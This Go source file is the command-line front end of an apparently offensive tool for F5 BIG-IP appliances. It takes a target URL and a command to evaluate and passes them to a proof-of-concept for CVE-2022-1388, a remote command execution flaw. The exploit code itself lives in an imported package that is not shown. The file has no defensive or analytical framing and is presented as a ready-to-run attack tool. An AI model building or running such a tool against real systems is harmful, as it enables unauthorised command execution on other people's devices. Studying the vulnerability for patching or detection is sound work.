package main

import (
	"F5-BIG-IP-TOOLS/pkg/cve_2022_1388"
	"flag"
	"fmt"
	"github.com/dimiro1/banner"
	"github.com/mattn/go-colorable"
	"os"
)

var (
	urlInput string
	command  string
)

func usage() {
	fmt.Println(`Usage of main.exe:
	-u url
		  you target, example: https://192.168.1.1
	-c command to eval
		  you command to eval, example: id`)
}

func bannerPrint() {
	bannerTemplate := fmt.Sprintf(`{{ .Title "%s" "smisome1" 4}}`, "F5 Tools")
	banner.InitString(colorable.NewColorableStdout(), true, true, bannerTemplate)
	fmt.Println("by    JsonGMax")
}

func main() {
	flag.StringVar(&urlInput, "u", "", "target")
	flag.StringVar(&command, "c", "", "command")
	flag.Usage = usage
	flag.Parse()
	bannerPrint()
	if urlInput == "" {
		usage()
		os.Exit(0)
	}
	cve_2022_1388.Poc(urlInput, command)
}
